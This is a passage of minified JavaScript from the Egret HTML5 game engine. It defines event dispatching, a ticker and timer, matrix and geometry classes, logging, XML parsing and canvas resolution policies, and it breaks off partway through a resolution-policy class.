var egret;!function(t){var e=function(){function t(){this._hashCode=t.hashCount++}return Object.defineProperty(t.prototype,"hashCode",{get:function(){return this._hashCode},enumerable:!0,configurable:!0}),t.hashCount=1,t}();t.HashObject=e,e.prototype.__class__="egret.HashObject"}(egret||(egret={}));var __extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i};!function(t){var e=function(t){function e(e){void 0===e&&(e=300),t.call(this),this.objectPool=[],this._length=0,1>e&&(e=1),this.autoDisposeTime=e,this.frameCount=0}return __extends(e,t),e.prototype._checkFrame=function(){this.frameCount--,0>=this.frameCount&&this.dispose()},Object.defineProperty(e.prototype,"length",{get:function(){return this._length},enumerable:!0,configurable:!0}),e.prototype.push=function(t){var i=this.objectPool;-1==i.indexOf(t)&&(i.push(t),this._length++,0==this.frameCount&&(this.frameCount=this.autoDisposeTime,e._callBackList.push(this)))},e.prototype.pop=function(){return 0==this._length?null:(this._length--,this.objectPool.pop())},e.prototype.dispose=function(){0<this._length&&(this.objectPool=[],this._length=0),this.frameCount=0;var t=e._callBackList,i=t.indexOf(this);-1!=i&&t.splice(i,1)},e._callBackList=[],e}(t.HashObject);t.Recycler=e,e.prototype.__class__="egret.Recycler"}(egret||(egret={})),function(t){t.__START_TIME,t.getTimer=function(){return Date.now()-t.__START_TIME}}(egret||(egret={})),function(t){t.__callLaterFunctionList=[],t.__callLaterThisList=[],t.__callLaterArgsList=[],t.callLater=function(e,i){for(var n=[],r=0;r<arguments.length-2;r++)n[r]=arguments[r+2];t.__callLaterFunctionList.push(e),t.__callLaterThisList.push(i),t.__callLaterArgsList.push(n)}}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),e.call(this),this._eventPhase=2,this._isPropagationImmediateStopped=this._isPropagationStopped=this._isDefaultPrevented=!1,this.isNew=!0,this._type=t,this._bubbles=i,this._cancelable=n}return __extends(i,e),Object.defineProperty(i.prototype,"type",{get:function(){return this._type},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"bubbles",{get:function(){return this._bubbles},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"cancelable",{get:function(){return this._cancelable},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"eventPhase",{get:function(){return this._eventPhase},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"currentTarget",{get:function(){return this._currentTarget},enumerable:!0,configurable:!0}),i.prototype._setCurrentTarget=function(t){this._currentTarget=t},Object.defineProperty(i.prototype,"target",{get:function(){return this._target},enumerable:!0,configurable:!0}),i.prototype.isDefaultPrevented=function(){return this._isDefaultPrevented},i.prototype.preventDefault=function(){this._cancelable&&(this._isDefaultPrevented=!0)},i.prototype.stopPropagation=function(){this._bubbles&&(this._isPropagationStopped=!0)},i.prototype.stopImmediatePropagation=function(){this._bubbles&&(this._isPropagationImmediateStopped=!0)},i.prototype._reset=function(){this.isNew?this.isNew=!1:(this._isPropagationImmediateStopped=this._isPropagationStopped=this._isDefaultPrevented=!1,this._currentTarget=this._target=null,this._eventPhase=2)},i._dispatchByTarget=function(e,i,n,r,s,o){void 0===s&&(s=!1),void 0===o&&(o=!1);var a=e.eventRecycler;a||(a=e.eventRecycler=new t.Recycler);var h=a.pop();if(h?h._type=n:h=new e(n),h._bubbles=s,h._cancelable=o,r)for(var l in r)h[l]=r[l],null!==h[l]&&(r[l]=null);return e=i.dispatchEvent(h),a.push(h),e},i._getPropertyData=function(t){var e=t._props;return e||(e=t._props={}),e},i.dispatchEvent=function(t,e,n,r){void 0===n&&(n=!1);var s=i._getPropertyData(i);r&&(s.data=r),i._dispatchByTarget(i,t,e,s,n)},i.ADDED_TO_STAGE="addedToStage",i.REMOVED_FROM_STAGE="removedFromStage",i.ADDED="added",i.REMOVED="removed",i.COMPLETE="complete",i.ENTER_FRAME="enterFrame",i.RENDER="render",i.FINISH_RENDER="finishRender",i.FINISH_UPDATE_TRANSFORM="finishUpdateTransform",i.LEAVE_STAGE="leaveStage",i.RESIZE="resize",i.CHANGE="change",i}(t.HashObject);t.Event=e,e.prototype.__class__="egret.Event"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),e.call(this,t,i,n)}return __extends(i,e),i.dispatchIOErrorEvent=function(e){t.Event._dispatchByTarget(i,e,i.IO_ERROR)},i.IO_ERROR="ioError",i}(t.Event);t.IOErrorEvent=e,e.prototype.__class__="egret.IOErrorEvent"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n,r,s,o,a,h,l,p){void 0===i&&(i=!0),void 0===n&&(n=!0),void 0===r&&(r=0),void 0===s&&(s=0),void 0===o&&(o=0),void 0===a&&(a=!1),void 0===h&&(h=!1),void 0===p&&(p=!1),e.call(this,t,i,n),this._localY=this._localX=this._stageY=this._stageX=0,this.touchPointID=r,this._stageX=s,this._stageY=o,this.ctrlKey=a,this.altKey=h,this.touchDown=p}return __extends(i,e),Object.defineProperty(i.prototype,"stageX",{get:function(){return this._stageX},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"stageY",{get:function(){return this._stageY},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"localX",{get:function(){return this._localX},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"localY",{get:function(){return this._localY},enumerable:!0,configurable:!0}),i.prototype._setCurrentTarget=function(i){e.prototype._setCurrentTarget.call(this,i),i instanceof t.DisplayObject&&(i=i.globalToLocal(this._stageX,this._stageY,t.Point.identity),this._localX=i.x,this._localY=i.y)},i.dispatchTouchEvent=function(e,n,r,s,o,a,h,l,p){void 0===r&&(r=0),void 0===s&&(s=0),void 0===o&&(o=0),void 0===a&&(a=!1),void 0===h&&(h=!1),void 0===l&&(l=!1),void 0===p&&(p=!1);var u=t.Event._getPropertyData(i);u.touchPointID=r,u._stageX=s,u._stageY=o,u.ctrlKey=a,u.altKey=h,u.shiftKey=l,u.touchDown=p,t.Event._dispatchByTarget(i,e,n,u,!0,!0)},i.TOUCH_TAP="touchTap",i.TOUCH_MOVE="touchMove",i.TOUCH_BEGIN="touchBegin",i.TOUCH_END="touchEnd",i.TOUCH_RELEASE_OUTSIDE="touchReleaseOutside",i.TOUCH_ROLL_OUT="touchRollOut",i.TOUCH_ROLL_OVER="touchRollOver",i.TOUCH_OUT="touchOut",i.TOUCH_OVER="touchOver",i}(t.Event);t.TouchEvent=e,e.prototype.__class__="egret.TouchEvent"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),e.call(this,t,i,n)}return __extends(i,e),i.dispatchTimerEvent=function(e,n){t.Event._dispatchByTarget(i,e,n)},i.TIMER="timer",i.TIMER_COMPLETE="timerComplete",i}(t.Event);t.TimerEvent=e,e.prototype.__class__="egret.TimerEvent"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.CAPTURING_PHASE=1,t.AT_TARGET=2,t.BUBBLING_PHASE=3,t}();t.EventPhase=e,e.prototype.__class__="egret.EventPhase"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){void 0===t&&(t=null),e.call(this),this._eventTarget=t||this}return __extends(i,e),i.prototype.addEventListener=function(e,i,n,r,s){void 0===r&&(r=!1),void 0===s&&(s=0),void 0===r&&(r=!1),void 0===s&&(s=0),i||t.Logger.fatal("addEventListener侦听函数不能为空"),r?(this._captureEventsMap||(this._captureEventsMap={}),r=this._captureEventsMap):(this._eventsMap||(this._eventsMap={}),r=this._eventsMap);var o=r[e];o||(o=r[e]=[]),this._insertEventBin(o,i,n,s)},i.prototype._insertEventBin=function(t,e,i,n){for(var r=-1,s=t.length,o=0;o<s;o++){var a=t[o];if(a.listener===e&&a.thisObject===i)return!1;-1==r&&a.priority<n&&(r=o)}return e={listener:e,thisObject:i,priority:n},-1!=r?t.splice(r,0,e):t.push(e),!0},i.prototype.removeEventListener=function(t,e,i,n){if(void 0===n&&(n=!1),n=n?this._captureEventsMap:this._eventsMap){var r=n[t];r&&(this._removeEventBin(r,e,i),0==r.length&&delete n[t])}},i.prototype._removeEventBin=function(t,e,i){for(var n=t.length,r=0;r<n;r++){var s=t[r];if(s.listener===e&&s.thisObject===i)return t.splice(r,1),!0}return!1},i.prototype.hasEventListener=function(t){return this._eventsMap&&this._eventsMap[t]||this._captureEventsMap&&this._captureEventsMap[t]},i.prototype.willTrigger=function(t){return this.hasEventListener(t)},i.prototype.dispatchEvent=function(t){return t._reset(),t._target=this._eventTarget,t._setCurrentTarget(this._eventTarget),this._notifyListener(t)},i.prototype._notifyListener=function(t){e=1==t._eventPhase?this._captureEventsMap:this._eventsMap;if(!e)return!0;if(!(e=e[t.type]))return!0;for(var e,i=(e=e.concat()).length,n=0;n<i;n++){var r=e[n];if(r.listener.call(r.thisObject,t),t._isPropagationImmediateStopped)break}return!t.isDefaultPrevented()},i.prototype.dispatchEventWith=function(e,i,n){void 0===i&&(i=!1),t.Event.dispatchEvent(this,e,i,n)},i}(t.HashObject);t.EventDispatcher=e,e.prototype.__class__="egret.EventDispatcher"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this.reuseEvent=new t.Event("")}return __extends(i,e),i.prototype.run=function(){t.Ticker.getInstance().run(),t.Ticker.getInstance().register(this.renderLoop,this,Number.NEGATIVE_INFINITY),t.Ticker.getInstance().register(this.broadcastEnterFrame,this,Number.POSITIVE_INFINITY),this.touchContext.run()},i.prototype.renderLoop=function(e){if((e=this.rendererContext).clearScreen(),0<t.__callLaterFunctionList.length){var i=t.__callLaterFunctionList;t.__callLaterFunctionList=[];var n=t.__callLaterThisList;t.__callLaterThisList=[];var r=t.__callLaterArgsList;t.__callLaterArgsList=[]}this.dispatchEventWith(t.Event.RENDER),t.Stage._invalidateRenderFlag&&(this.broadcastRender(),t.Stage._invalidateRenderFlag=!1),i&&this.doCallLaterList(i,n,r),this.stage._updateTransform(),this.dispatchEventWith(t.Event.FINISH_UPDATE_TRANSFORM),this.stage._draw(e),this.dispatchEventWith(t.Event.FINISH_RENDER)},i.prototype.broadcastEnterFrame=function(e){(e=this.reuseEvent)._type=t.Event.ENTER_FRAME,this.dispatchEvent(e);for(var i=t.DisplayObject._enterFrameCallBackList.concat(),n=i.length,r=0;r<n;r++){var s=i[r];e._target=s.display,e._setCurrentTarget(s.display),s.listener.call(s.thisObject,e)}for(r=(i=t.Recycler._callBackList).length-1;0<=r;r--)i[r]._checkFrame()},i.prototype.broadcastRender=function(){var e=this.reuseEvent;e._type=t.Event.RENDER;for(var i=t.DisplayObject._renderCallBackList.concat(),n=i.length,r=0;r<n;r++){var s=i[r];e._target=s.display,e._setCurrentTarget(s.display),s.listener.call(s.thisObject,e)}},i.prototype.doCallLaterList=function(t,e,i){for(var n=t.length,r=0;r<n;r++){var s=t[r];null!=s&&s.apply(e[r],i[r])}},i.DEVICE_PC="web",i.DEVICE_MOBILE="native",i}(t.EventDispatcher);t.MainContext=e,e.prototype.__class__="egret.MainContext"}(egret||(egret={}));var testDeviceType=function(){if(!this.navigator)return!0;var t=navigator.userAgent.toLowerCase();return-1!=t.indexOf("mobile")||-1!=t.indexOf("android")};egret.MainContext.instance=new egret.MainContext,egret.MainContext.deviceType=testDeviceType()?egret.MainContext.DEVICE_MOBILE:egret.MainContext.DEVICE_PC,function(t){var e=function(){function e(){this._tick=this._preDrawCount=this._updateTransformPerformanceCost=this._renderPerformanceCost=this._logicPerformanceCost=this._lastTime=0,this._maxDeltaTime=500,this._totalDeltaTime=0}return e.getInstance=function(){return null==e.instance&&(e.instance=new e),e.instance},e.prototype.run=function(){t.Ticker.getInstance().register(this.update,this);var e=t.MainContext.instance;e.addEventListener(t.Event.ENTER_FRAME,this.onEnterFrame,this),e.addEventListener(t.Event.RENDER,this.onStartRender,this),e.addEventListener(t.Event.FINISH_RENDER,this.onFinishRender,this),e.addEventListener(t.Event.FINISH_UPDATE_TRANSFORM,this.onFinishUpdateTransform,this)},e.prototype.onEnterFrame=function(e){this._lastTime=t.getTimer()},e.prototype.onStartRender=function(e){e=t.getTimer(),this._logicPerformanceCost=e-this._lastTime,this._lastTime=e},e.prototype.onFinishUpdateTransform=function(e){e=t.getTimer(),this._updateTransformPerformanceCost=e-this._lastTime,this._lastTime=e},e.prototype.onFinishRender=function(e){e=t.getTimer(),this._renderPerformanceCost=e-this._lastTime,this._lastTime=e},e.prototype.update=function(e){if(this._tick++,this._totalDeltaTime+=e,this._totalDeltaTime>=this._maxDeltaTime){e=(this._preDrawCount-1).toString();Math.ceil(this._logicPerformanceCost).toString(),Math.ceil(this._updateTransformPerformanceCost).toString(),Math.ceil(this._renderPerformanceCost).toString(),Math.ceil(t.MainContext.instance.rendererContext.renderCost).toString();this._tick=this._totalDeltaTime=0}this._preDrawCount=0},e.prototype.onDrawImage=function(){this._preDrawCount++},e}();t.Profiler=e,e.prototype.__class__="egret.Profiler"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.apply(this,arguments),this._timeScale=1,this._paused=!1,this.callBackList=[]}return __extends(i,e),i.prototype.run=function(){t.__START_TIME=(new Date).getTime(),t.MainContext.instance.deviceContext.executeMainLoop(this.update,this)},i.prototype.update=function(t){var e=this.callBackList.concat(),i=e.length;t*=this._timeScale,t*=this._timeScale;for(var n=0;n<i;n++){var r=e[n];r.listener.call(r.thisObject,t)}},i.prototype.register=function(t,e,i){void 0===i&&(i=0),this._insertEventBin(this.callBackList,t,e,i)},i.prototype.unregister=function(t,e){this._removeEventBin(this.callBackList,t,e)},i.prototype.setTimeout=function(e,i,n){for(var r=[],s=0;s<arguments.length-3;s++)r[s]=arguments[s+3];t.Logger.warning("Ticker#setTimeout方法即将废弃,请使用egret.setTimeout"),t.setTimeout.apply(null,[e,i,n].concat(r))},i.prototype.setTimeScale=function(t){this._timeScale=t},i.prototype.getTimeScale=function(){return this._timeScale},i.prototype.pause=function(){this._paused=!0},i.prototype.resume=function(){this._paused=!1},i.getInstance=function(){return null==i.instance&&(i.instance=new i),i.instance},i}(t.EventDispatcher);t.Ticker=e,e.prototype.__class__="egret.Ticker"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.LEFT="left",t.RIGHT="right",t.CENTER="center",t.JUSTIFY="justify",t.CONTENT_JUSTIFY="contentJustify",t}();t.HorizontalAlign=e,e.prototype.__class__="egret.HorizontalAlign"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.TOP="top",t.BOTTOM="bottom",t.MIDDLE="middle",t.JUSTIFY="justify",t.CONTENT_JUSTIFY="contentJustify",t}();t.VerticalAlign=e,e.prototype.__class__="egret.VerticalAlign"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i){void 0===i&&(i=0),e.call(this),this._currentCount=0,this.delay=t,this.repeatCount=i}return __extends(i,e),i.prototype.currentCount=function(){return this._currentCount},Object.defineProperty(i.prototype,"running",{get:function(){return this._running},enumerable:!0,configurable:!0}),i.prototype.reset=function(){this.stop(),this._currentCount=0},i.prototype.start=function(){this._running||(this.lastTime=t.getTimer(),0!=this._currentCount&&(this._currentCount=0),t.Ticker.getInstance().register(this.onEnterFrame,this),this._running=!0)},i.prototype.stop=function(){this._running&&(t.Ticker.getInstance().unregister(this.onEnterFrame,this),this._running=!1)},i.prototype.onEnterFrame=function(e){(e=t.getTimer())-this.lastTime>this.delay&&(this.lastTime=e,this._currentCount++,t.TimerEvent.dispatchTimerEvent(this,t.TimerEvent.TIMER),0<this.repeatCount&&this._currentCount>=this.repeatCount&&(this.stop(),t.TimerEvent.dispatchTimerEvent(this,t.TimerEvent.TIMER_COMPLETE)))},i}(t.EventDispatcher);t.Timer=e,e.prototype.__class__="egret.Timer"}(egret||(egret={})),(egret||(egret={})).getQualifiedClassName=function(t){if((t=t.prototype?t.prototype:t.__proto__).hasOwnProperty("__class__"))return t.__class__;var e=(i=t.constructor.toString()).indexOf("("),i=i.substring(9,e);return t.__class__=i},function(t){var e={};(egret||(egret={})).getDefinitionByName=function(t){if(!t)return null;if(r=e[t])return r;for(var i=t.split("."),n=i.length,r=__global,s=0;s<n;s++)if(!(r=r[i[s]]))return null;return e[t]=r}}();var __global=__global||this;!function(t){function e(t){for(var e in i){var n=i[e];n.delay-=t,0>=n.delay&&(n.listener.apply(n.thisObject,n.params),delete i[e])}}var i={},n=0;t.setTimeout=function(r,s,o){for(var a=[],h=0;h<arguments.length-3;h++)a[h]=arguments[h+3];return a={listener:r,thisObject:s,delay:o,params:a},0==n&&t.Ticker.getInstance().register(e,null),n++,i[n]=a,n},t.clearTimeout=function(t){delete i[t]}}(egret||(egret={})),function(t){t.hasDefinition=function(e){return!!t.getDefinitionByName(e)}}(egret||(egret={})),(egret||(egret={})).toColorString=function(t){for((isNaN(t)||0>t)&&(t=0),16777215<t&&(t=16777215),t=t.toString(16).toUpperCase();6>t.length;)t="0"+t;return"#"+t},__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i,n,r,s,o){void 0===t&&(t=1),void 0===i&&(i=0),void 0===n&&(n=0),void 0===r&&(r=1),void 0===s&&(s=0),void 0===o&&(o=0),e.call(this),this.a=t,this.b=i,this.c=n,this.d=r,this.tx=s,this.ty=o}return __extends(i,e),i.prototype.prepend=function(t,e,i,n,r,s){var o=this.tx;if(1!=t||0!=e||0!=i||1!=n){var a=this.a,h=this.c;this.a=a*t+this.b*i,this.b=a*e+this.b*n,this.c=h*t+this.d*i,this.d=h*e+this.d*n}return this.tx=o*t+this.ty*i+r,this.ty=o*e+this.ty*n+s,this},i.prototype.append=function(t,e,i,n,r,s){var o=this.a,a=this.b,h=this.c,l=this.d;return this.a=t*o+e*h,this.b=t*a+e*l,this.c=i*o+n*h,this.d=i*a+n*l,this.tx=r*o+s*h+this.tx,this.ty=r*a+s*l+this.ty,this},i.prototype.prependMatrix=function(t){return this.prepend(t.a,t.b,t.c,t.d,t.tx,t.ty),this},i.prototype.appendMatrix=function(t){return this.append(t.a,t.b,t.c,t.d,t.tx,t.ty),this},i.prototype.prependTransform=function(t,e,n,r,s,o,a,h,l){if(s%360){var p=s*i.DEG_TO_RAD;s=Math.cos(p),p=Math.sin(p)}else s=1,p=0;return(h||l)&&(this.tx-=h,this.ty-=l),o||a?(o*=i.DEG_TO_RAD,a*=i.DEG_TO_RAD,this.prepend(s*n,p*n,-p*r,s*r,0,0),this.prepend(Math.cos(a),Math.sin(a),-Math.sin(o),Math.cos(o),t,e)):this.prepend(s*n,p*n,-p*r,s*r,t,e),this},i.prototype.appendTransform=function(t,e,n,r,s,o,a,h,l){if(s%360){var p=s*i.DEG_TO_RAD;s=Math.cos(p),p=Math.sin(p)}else s=1,p=0;return o||a?(o*=i.DEG_TO_RAD,a*=i.DEG_TO_RAD,this.append(Math.cos(a),Math.sin(a),-Math.sin(o),Math.cos(o),t,e),this.append(s*n,p*n,-p*r,s*r,0,0)):this.append(s*n,p*n,-p*r,s*r,t,e),(h||l)&&(this.tx-=h*this.a+l*this.c,this.ty-=h*this.b+l*this.d),this},i.prototype.rotate=function(t){var e=Math.cos(t);t=Math.sin(t);var i=this.a,n=this.c,r=this.tx;return this.a=i*e-this.b*t,this.b=i*t+this.b*e,this.c=n*e-this.d*t,this.d=n*t+this.d*e,this.tx=r*e-this.ty*t,this.ty=r*t+this.ty*e,this},i.prototype.skew=function(t,e){return t*=i.DEG_TO_RAD,e*=i.DEG_TO_RAD,this.append(Math.cos(e),Math.sin(e),-Math.sin(t),Math.cos(t),0,0),this},i.prototype.scale=function(t,e){return this.a*=t,this.d*=e,this.c*=t,this.b*=e,this.tx*=t,this.ty*=e,this},i.prototype.translate=function(t,e){return this.tx+=t,this.ty+=e,this},i.prototype.identity=function(){return this.a=this.d=1,this.b=this.c=this.tx=this.ty=0,this},i.prototype.invert=function(){var t=this.a,e=this.b,i=this.c,n=this.d,r=this.tx,s=t*n-e*i;return this.a=n/s,this.b=-e/s,this.c=-i/s,this.d=t/s,this.tx=(i*this.ty-n*r)/s,this.ty=-(t*this.ty-e*r)/s,this},i.transformCoords=function(e,i,n){var r=t.Point.identity;return r.x=e.a*i+e.c*n+e.tx,r.y=e.d*n+e.b*i+e.ty,r},i.prototype.toArray=function(t){return this.array||(this.array=new Float32Array(9)),t?(this.array[0]=this.a,this.array[1]=this.b,this.array[2]=0,this.array[3]=this.c,this.array[4]=this.d,this.array[5]=0,this.array[6]=this.tx,this.array[7]=this.ty):(this.array[0]=this.a,this.array[1]=this.b,this.array[2]=this.tx,this.array[3]=this.c,this.array[4]=this.d,this.array[5]=this.ty,this.array[6]=0,this.array[7]=0),this.array[8]=1,this.array},i.identity=new i,i.DEG_TO_RAD=Math.PI/180,i}(t.HashObject);t.Matrix=e,e.prototype.__class__="egret.Matrix"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(e,i){void 0===e&&(e=0),void 0===i&&(i=0),t.call(this),this.x=e,this.y=i}return __extends(e,t),e.prototype.clone=function(){return new e(this.x,this.y)},e.prototype.equals=function(t){return this.x==t.x&&this.y==t.y},e.distance=function(t,e){return Math.sqrt((t.x-e.x)*(t.x-e.x)+(t.y-e.y)*(t.y-e.y))},e.identity=new e(0,0),e}(t.HashObject);t.Point=e,e.prototype.__class__="egret.Point"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(t){function e(e,i,n,r){void 0===e&&(e=0),void 0===i&&(i=0),void 0===n&&(n=0),void 0===r&&(r=0),t.call(this),this.x=e,this.y=i,this.width=n,this.height=r}return __extends(e,t),Object.defineProperty(e.prototype,"right",{get:function(){return this.x+this.width},set:function(t){this.width=t-this.x},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"bottom",{get:function(){return this.y+this.height},set:function(t){this.height=t-this.y},enumerable:!0,configurable:!0}),e.prototype.initialize=function(t,e,i,n){return this.x=t,this.y=e,this.width=i,this.height=n,this},e.prototype.contains=function(t,e){return this.x<=t&&this.x+this.width>=t&&this.y<=e&&this.y+this.height>=e},e.prototype.intersects=function(t){return!!(this.contains(t.x,t.y)||this.contains(t.x,t.bottom)||this.contains(t.right,t.y)||this.contains(t.right,t.bottom))},e.prototype.clone=function(){return new e(this.x,this.y,this.width,this.height)},e.prototype.containsPoint=function(t){return this.x<t.x&&this.x+this.width>t.x&&this.y<t.y&&this.y+this.height>t.y},e.identity=new e(0,0,0,0),e}(t.HashObject);t.Rectangle=e,e.prototype.__class__="egret.Rectangle"}(egret||(egret={})),function(t){var e=function(){function e(){}return e.fatal=function(e,i){throw void 0===i&&(i=null),t.Logger.traceToConsole("Fatal",e,i),Error(t.Logger.getTraceCode("Fatal",e,i))},e.info=function(e,i){void 0===i&&(i=null),t.Logger.traceToConsole("Info",e,i)},e.warning=function(e,i){void 0===i&&(i=null),t.Logger.traceToConsole("Warning",e,i)},e.traceToConsole=function(e,i,n){console.log(t.Logger.getTraceCode(e,i,n))},e.getTraceCode=function(t,e,i){return"["+t+"]"+e+":"+(null==i?"":i)},e}();t.Logger=e,e.prototype.__class__="egret.Logger"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._isSupportDOMParser=this._xmlDict=this._parser=null,this._xmlDict={},window.DOMParser?(this._isSupportDOMParser=!0,this._parser=new DOMParser):this._isSupportDOMParser=!1}return __extends(i,e),i.getInstance=function(){return i._instance||(i._instance=new i),i._instance},i.prototype.parserXML=function(e){for(var i=0;"\n"==e.charAt(i)||"\t"==e.charAt(i)||"\r"==e.charAt(i)||" "==e.charAt(i);)i++;return 0!=i&&(e=e.substring(i,e.length)),this._isSupportDOMParser?i=this._parser.parseFromString(e,"text/xml"):(i=new ActiveXObject("Microsoft.XMLDOM"),i.async="false",i.loadXML(e)),null==i&&t.Logger.info("xml not found!"),i},i._instance=null,i}(t.HashObject);t.SAXParser=e,e.prototype.__class__="egret.SAXParser"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._designHeight=this._designWidth=0,this._scaleY=this._scaleX=1;var t=document.getElementById(i.canvas_name),n=t.height;this._designWidth=t.width,this._designHeight=n}return __extends(i,e),i.getInstance=function(){return null==i.instance&&(n.initialize(),i.instance=new i),i.instance},i.prototype.setDesignSize=function(e,i,n){this._designWidth=e,this._designHeight=i,n&&(t.Logger.warning("该方法目前不应传入 resolutionPolicy 参数，请在 docs/1.0_Final_ReleaseNote中查看如何升级"),this._setResolutionPolicy(n))},i.prototype._setResolutionPolicy=function(t){this._resolutionPolicy=t,t.init(this),t._apply(this,this._designWidth,this._designHeight)},i.prototype.getScaleX=function(){return this._scaleX},i.prototype.getScaleY=function(){return this._scaleY},i.canvas_name="gameCanvas",i.canvas_div_name="gameDiv",i}(t.HashObject);t.StageDelegate=e,e.prototype.__class__="egret.StageDelegate";var i=function(){function t(t,e){this.setContainerStrategy(t),this.setContentStrategy(e)}return t.prototype.init=function(t){this._containerStrategy.init(t),this._contentStrategy.init(t)},t.prototype._apply=function(t,e,i){this._containerStrategy._apply(t,e,i),this._contentStrategy._apply(t,e,i)},t.prototype.setContainerStrategy=function(t){t instanceof n&&(this._containerStrategy=t)},t.prototype.setContentStrategy=function(t){t instanceof s&&(this._contentStrategy=t)},t}();t.ResolutionPolicy=i,i.prototype.__class__="egret.ResolutionPolicy";var n=function(){function t(){}return t.initialize=function(){t.EQUAL_TO_FRAME=new r},t.prototype.init=function(t){},t.prototype._apply=function(t,e,i){},t.prototype._setupContainer=function(){var t,e=document.body;e&&(t=e.style)&&(t.paddingTop=t.paddingTop||"0px",t.paddingRight=t.paddingRight||"0px",t.paddingBottom=t.paddingBottom||"0px",t.paddingLeft=t.paddingLeft||"0px",t.borderTop=t.borderTop||"0px",t.borderRight=t.borderRight||"0px",t.borderBottom=t.borderBottom||"0px",t.borderLeft=t.borderLeft||"0px",t.marginTop=t.marginTop||"0px",t.marginRight=t.marginRight||"0px",t.marginBottom=t.marginBottom||"0px",t.marginLeft=t.marginLeft||"0px")},t}();t.ContainerStrategy=n,n.prototype.__class__="egret.ContainerStrategy";var r=function(t){function e(){t.apply(this,arguments)}return __extends(e,t),e.prototype._apply=function(t){this._setupContainer()},e}(n);t.EqualToFrame=r,r.prototype.__class__="egret.EqualToFrame";var s=function(){function t(){}return t.prototype.init=function(t){},t.prototype._apply=function(t,e,i){},t}();t.ContentStrategy=s,s.prototype.__class__="egret.ContentStrategy",i=function(t){function i(e){void 0===e&&(e=0),t.call(this),this.minWidth=e}return __extends(i,t),i.prototype._apply=function(t,i,n){i=document.getElementById(e.canvas_name);var r=document.getElementById(e.canvas_div_name),s=document.documentElement.clientWidth,o=document.documentElement.clientHeight,a=o/n,h=s/a,l=1;0!=this.minWidth&&(l=Math.min(1,h/this.minWidth)),i.width=h/l,i.height=n,i.style.width=s+"px",i.style.height=o*l+"px",r.style.width=s+"px",r.style.height=o*l+"px",t._scaleX=a*l,t._scaleY=a*l},i}(s),t.FixedHeight=i,i.prototype.__class__="egret.FixedHeight",i=function(t){function i(e){void 0===e&&(e=0),t.call(this),this.minHeight=e}return __extends(i,t),i.prototype._apply=function(t,i,n){n=document.getElementById(e.canvas_name);var r=document.getElementById(e.canvas_div_name),s=document.documentElement.clientWidth,o=document.documentElement.clientHeight,a=s/i,h=o/a,l=1;0!=this.minHeight&&(l=Math.min(1,h/this.minHeight)),n.width=i,n.height=h/l,n.style.width=s*l+"px",n.style.height=o+"px",r.style.width=s*l+"px",r.style.height=o+"px",t._scaleX=a*l,t._scaleY=a*l},i}(s),t.FixedWidth=i,i.prototype.__class__="egret.FixedWidth",i=function(t){function i(e,i){t.call(this),this.width=e,this.height=i}return __extends(i,t),i.prototype._apply=function(t,i,n){n=document.getElementById(e.canvas_name);var 